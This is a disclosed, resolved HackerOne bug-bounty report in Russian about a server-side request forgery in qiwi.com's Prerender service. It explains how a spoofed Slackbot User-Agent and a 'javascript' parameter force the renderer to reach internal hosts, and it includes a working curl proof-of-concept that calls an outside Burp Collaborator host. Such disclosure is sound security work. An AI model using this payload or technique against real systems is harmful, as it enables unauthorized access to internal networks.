---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1153862'
original_report_id: '1153862'
title: SSRF на https://qiwi.com с помощью "Prerender HAR Capturer"
weakness: Server-Side Request Forgery (SSRF)
team_handle: qiwi
created_at: '2021-04-07T00:36:23.246Z'
disclosed_at: '2021-05-22T08:29:30.870Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 77
asset_identifier: Main domain
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# SSRF на https://qiwi.com с помощью "Prerender HAR Capturer"

## Metadata

- HackerOne Report ID: 1153862
- Weakness: Server-Side Request Forgery (SSRF)
- Program: qiwi
- Disclosed At: 2021-05-22T08:29:30.870Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Здравствуйте!

На сайте https://qiwi.com вы используете Prerender HAR Capturer 5.6.0 на основе Headless Chrome для рендеринга HTML, снимков экрана, PDF-файлов и файлов HAR с любой веб-страницы (https://github.com/prerender/prerender).

Если на qiwi.com послать запрос с измененным юзер-агентом "User-Agent: SlackbotLinkExpanding 1.0 (+https://api.slack.com/robots)" - якобы от слакбота, этот запрос будет передан на обработку Пререндереру.
Prerender так-же может выполнять javascript код посланный ему в GET параметре "javascript=window.prerenderData". 
Я обнаружил что с помощью этого параметра можно выполнять запросы как во внутренней сети qiwi, так и к любому другому домену в интернете.

Например можно получить отстук на бёрп коллаборатор если послать такой запрос: 
curl -i -s -k -X $'GET' -H 'Host: qiwi.com' -H 'User-Agent: SlackbotLinkExpanding 1.0 (+https://api.slack.com/robots)' 'https://qiwi.com/?javascript=window.prerenderData=window.location.replace%28%22http%3a%2f%2frytiogvgz2oh53enbt9rxuwmpdv4jt.burpcollaborator.net%2f%22%29'
В интрасети я послал запросы только к некоторым хостам (10.250.33.17, 10.250.33.1) только что-бы удостовериться что я во внутренней сети.
Да а адрес 10.250.33.18 я узнал из ответа сервера qiwi.com послав запрос с параметром "?renderType=har" - который определяет тип возвращаемого контента.

## Impact

SSRF

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
